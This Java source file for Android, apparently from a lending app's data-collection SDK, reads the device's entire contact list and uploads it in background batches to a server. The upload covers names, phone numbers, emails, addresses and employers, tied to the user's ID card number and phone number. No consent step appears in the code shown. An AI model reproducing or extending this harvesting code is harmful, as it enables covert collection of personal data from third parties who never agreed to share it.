package com.yxjr.credit.grab;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.PhoneLookup;
import android.provider.ContactsContract.CommonDataKinds.Organization;

import com.yxjr.credit.constants.HttpConstant;
import com.yxjr.credit.constants.SpConstant;
import com.yxjr.credit.http.manage.NoConfineAsyncTask;
import com.yxjr.credit.log.YxLog;
import com.yxjr.credit.util.YxStoreUtil;

public class ContactsGrab extends Grab {

	/**
	 * 姓名长度限制：90
	 */
	public static final int mNameMaxLength = 90;
	/**
	 * 手机长度限制：20
	 */
	public static final int mPhoneNumberMaxLength = 20;
	/**
	 * 邮箱长度限制：50
	 */
	private final int mEmailContentMaxLength = 50;
	/**
	 * 街道长度限制：100
	 */
	private final int mStreetMaxLength = 100;
	/**
	 * 市长度限制：60
	 */
	private final int mCityMaxLength = 60;
	/**
	 * 邮编长度限制：20
	 */
	private final int mZipMaxLength = 20;
	/**
	 * 省长度限制：60
	 */
	private final int mStateMaxLength = 60;
	/**
	 * 国家长度限制：60
	 */
	private final int mCountryMaxLength = 60;
	/**
	 * 公司名称长度限制：200
	 */
	private final int mCompanyMaxLength = 200;

	private Context mContext;

	public ContactsGrab(Context context) {
		this.mContext = context;
	}

	@Override
	public void upload() {
		new Task().execute();
	}

	private class Task extends NoConfineAsyncTask<String, String, String> {

		@Override
		protected String doInBackground(String... params) {
			try {
				JSONArray contacts = getData();
				int interval = getInterval(mContext, SpConstant.CSQ);
				boolean surpass = isSurpass(mContext, SpConstant.C_IS);
				if (interval != 0 && null != contacts && surpass) {
					final String idCard = YxStoreUtil.get(mContext, SpConstant.PARTNER_ID_CARD_NUM);
					final String phoneNo = YxStoreUtil.get(mContext, SpConstant.PARTNER_PHONENUMBER);
					batchJSONArray(contacts, interval, new OnBatchListener() {

						@Override
						public void onBatch(JSONArray array) {
							try {
								JSONObject contactsInfo = new JSONObject();
								contactsInfo.put("cert", idCard);
								contactsInfo.put("mobileNo", phoneNo);
								contactsInfo.put("contacts", array);
								sendServer(mContext, HttpConstant.Request.SEND_CONTACTS, contactsInfo);
							} catch (JSONException e) {
								e.printStackTrace();
							}
						}
					});
					YxStoreUtil.save(mContext, SpConstant.C_IS, "N");
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				YxLog.e("Exception:" + e);
				e.printStackTrace();
			}
			return "";
		}
	}

	@Override
	public JSONArray getData() {
		return GetContacts();
	}

	/**
	 * 从本地手机中获取全部|查询全部字段
	 */
	@SuppressLint({"SimpleDateFormat", "InlinedApi"})
	public JSONArray GetContacts() {
		JSONArray contacts = new JSONArray();
		Cursor contactsCursor = null;
		ContentResolver cr = mContext.getContentResolver();// 得到ContentResolver对象
		try {
			contactsCursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, "sort_key COLLATE LOCALIZED asc"); // 取得电话本中开始一项的光标
			if (null != contactsCursor && contactsCursor.getCount() > 0) {
				if (contactsCursor.moveToFirst()) {// 查询结果是否为空
					int idContactColumn = contactsCursor.getColumnIndex(ContactsContract.Contacts._ID);// 取得联系人ID列
					int nameColumn = contactsCursor.getColumnIndex(PhoneLookup.DISPLAY_NAME);// 取得联系人名字列
					int updateTimeColumn = contactsCursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP);//最后一次更新时间
					do {
						JSONObject contact = new JSONObject();
						String contactId = contactsCursor.getString(idContactColumn);// 获取联系人ID
						String displayName = contactsCursor.getString(nameColumn);// 获取联系人姓名
						String updateTime = contactsCursor.getString(updateTimeColumn);// 获取联系人更新时间
						//联系人更新时间
						if (null != updateTime) {
							if (!updateTime.equals("0")) {
								String updateTimeFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(updateTime)));
								contact.put("updateTime", updateTimeFormat);
							}
						}
						//联系人显示的姓名
						if (null != displayName) {
							contact.put("name", subStringByByte(displayName, mNameMaxLength));
						}
						// 获得该联系人号码
						queryPhone(cr, contactsCursor, contact, contactId, displayName);
						// 获得该联系人的email信息
						queryEmails(cr, contactId, contact);
						// 获取该联系人地址
						queryAddresses(cr, contactId, contact);
						// 获取该联系人组织
						queryCompany(cr, contactId, contact);
						// YxLog.d("=============="+contact.toString());
						contacts.put(contact);
					} while (contactsCursor.moveToNext());
				}
			}
		} catch (SecurityException se) {
			YxLog.e("SecurityException:without permission android.permission.READ_CONTACTS or android.permission.WRITE_CONTACTS！" + se);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			YxLog.e("Exception:" + e);
			e.printStackTrace();
		} finally {
			if (contactsCursor != null) {
				contactsCursor.close();
			}
		}
		return contacts;
	}

	/**
	 * 获得该联系人号码
	 */
	private void queryPhone(ContentResolver cr, Cursor contactsCursor, JSONObject contact, String contactId, String displayName) throws JSONException {
		//联系人号码个数
		int phoneCount = contactsCursor.getInt(contactsCursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));// 查看联系人有多少个号码，如果没有号码，返回0
		if (phoneCount > 0) {
			// 取得电话号码(可能存在多个号码)
			Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);// 在类ContactsContract.CommonDataKinds.Phone中根据查询相应id联系人的所有电话；
			if (null != phoneCursor && phoneCursor.moveToFirst()) {// phoneCursor.moveToFirst()查询结果是否为空
				JSONArray phones = new JSONArray();
				do {
					String PhoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					JSONObject phone = new JSONObject();
					if (null != PhoneNumber) {
						phone.put("phoneContent", subStringByByte(PhoneNumber, mPhoneNumberMaxLength));
					}
					String phoneType = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
					if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM + "")) {// CUSTOM自定义电话
						phone.put("phoneLabel", "自定义");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_HOME + "")) {// HOME家庭电话
						phone.put("phoneLabel", "家庭");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE + "")) {// MOBILE手机电话
						phone.put("phoneLabel", "手机");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_WORK + "")) {// WORK工作电话
						phone.put("phoneLabel", "工作");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK + "")) {// FAX_WORK工作传真
						phone.put("phoneLabel", "工作传真");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME + "")) {// FAX_HOME家庭传真
						phone.put("phoneLabel", "家庭传真");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_PAGER + "")) {// PAGER寻呼机
						phone.put("phoneLabel", "寻呼机");
					} else if (phoneType.equals(ContactsContract.CommonDataKinds.Phone.TYPE_OTHER + "")) {// OTHER其他电话
						phone.put("phoneLabel", "其他");
					} else {// 未知
						phone.put("phoneLabel", "未知");// 未知电话
					}
					phones.put(phone);
				} while (phoneCursor.moveToNext());
				contact.put("phoneCount", phones.length());//联系人号码个数
				contact.put("phones", phones);
			}
			if (null != phoneCursor) {
				phoneCursor.close();
			}
		}
	}

	/**
	 * 获得该联系人的email信息
	 */
	private void queryEmails(ContentResolver cr, String contactId, JSONObject contact) throws JSONException {
		Cursor emailsCursor = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=" + contactId, null, null);
		if (null != emailsCursor && emailsCursor.moveToFirst() && emailsCursor.getCount() > 0) {// emailsCursor.moveToFirst()查询结果是否为空
			JSONArray emails = new JSONArray();
			int emailIndex = emailsCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
			do {
				String emailContent = emailsCursor.getString(emailIndex);
				String emailType = emailsCursor.getString(emailsCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
				JSONObject email = new JSONObject();
				if (null != emailContent) {
					email.put("mailContent", subStringByByte(emailContent, mEmailContentMaxLength));
				}
				if (emailType.equals(ContactsContract.CommonDataKinds.Email.TYPE_CUSTOM + "")) {// CUSTOM自定义
					email.put("mailLabel", "自定义邮箱");
				} else if (emailType.equals(ContactsContract.CommonDataKinds.Email.TYPE_HOME + "")) {// HOME家庭
					email.put("mailLabel", "家庭邮箱");
				} else if (emailType.equals(ContactsContract.CommonDataKinds.Email.TYPE_WORK + "")) {// WORK工作
					email.put("mailLabel", "工作邮箱");
				} else if (emailType.equals(ContactsContract.CommonDataKinds.Email.TYPE_OTHER + "")) {// OTHER其他
					email.put("mailLabel", "其他邮箱");
				} else if (emailType.equals(ContactsContract.CommonDataKinds.Email.TYPE_MOBILE + "")) {// MOBILE手机
					email.put("mailLabel", "手机邮箱");
				} else {// FAX_HOME家庭传真
					email.put("mailLabel", "未知邮箱");
				}
				emails.put(email);
			} while (emailsCursor.moveToNext());
			contact.put("emails", emails);
		}
		if (null != emailsCursor) {
			emailsCursor.close();
		}
	}

	/**
	 * 获取该联系人地址
	 */
	private void queryAddresses(ContentResolver cr, String contactId, JSONObject contact) throws JSONException {
		Cursor addressCursor = cr.query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
		if (null != addressCursor && addressCursor.moveToFirst() && addressCursor.getCount() > 0) {// addressCursor.moveToFirst()查询结果是否为空
			JSONArray addresses = new JSONArray();
			do {
				String street = addressCursor.getString(addressCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
				String addressLabel = addressCursor.getString(addressCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
				String city = addressCursor.getString(addressCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
				String zip = addressCursor.getString(addressCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
				String state = addressCursor.getString(addressCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
				String country = addressCursor.getString(addressCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
				JSONObject address = new JSONObject();
				if (null != street) {// 街道
					address.put("street", subStringByByte(street, mStreetMaxLength));
				}
				if (null != addressLabel) {// 地址类型
					if (addressLabel.equals(ContactsContract.CommonDataKinds.StructuredPostal.TYPE_CUSTOM + "")) {// CUSTOM自定义
						address.put("addressLabel", "自定义地址");
					} else if (addressLabel.equals(ContactsContract.CommonDataKinds.StructuredPostal.TYPE_HOME + "")) {// HOME家庭
						address.put("addressLabel", "家庭地址");
					} else if (addressLabel.equals(ContactsContract.CommonDataKinds.StructuredPostal.TYPE_WORK + "")) {// WORK工作
						address.put("addressLabel", "工作地址");
					} else if (addressLabel.equals(ContactsContract.CommonDataKinds.StructuredPostal.TYPE_OTHER + "")) {// OTHER其他
						address.put("addressLabel", "其他地址");
					} else {// MOBILE手机
						address.put("addressLabel", "未知地址");
					}
				}
				if (null != city) {// 城市
					address.put("city", subStringByByte(city, mCityMaxLength));
				}
				if (null != zip) {// 邮编
					address.put("zip", subStringByByte(zip, mZipMaxLength));
				}
				if (null != state) {// 省份
					address.put("state", subStringByByte(state, mStateMaxLength));
				}
				if (null != country) {// 国家
					address.put("country", subStringByByte(country, mCountryMaxLength));
				}
				// 国家代码(Android获取不到)
				// address.put("countryCode", "");
				addresses.put(address);
			} while (addressCursor.moveToNext());
			contact.put("addresses", addresses);
		}
		if (null != addressCursor) {
			addressCursor.close();
		}
	}

	/**
	 * 获取该联系人组织(公司名)
	 */
	private void queryCompany(ContentResolver cr, String contactId, JSONObject contact) throws JSONException {
		Cursor organizationsCursor = cr.query(Data.CONTENT_URI, new String[]{Data._ID, Organization.COMPANY, Organization.TITLE},
				Data.CONTACT_ID + "=?" + " AND " + Data.MIMETYPE + "='" + Organization.CONTENT_ITEM_TYPE + "'", new String[]{contactId}, null);
		if (null != organizationsCursor && organizationsCursor.moveToFirst() && organizationsCursor.getCount() > 0) {
			do {
				String company = organizationsCursor.getString(organizationsCursor.getColumnIndex(Organization.COMPANY));// 公司
				if (null != company) {
					contact.put("company", subStringByByte(company, mCompanyMaxLength));
				}
			} while (organizationsCursor.moveToNext());
		}
		if (null != organizationsCursor) {
			organizationsCursor.close();
		}
	}

}
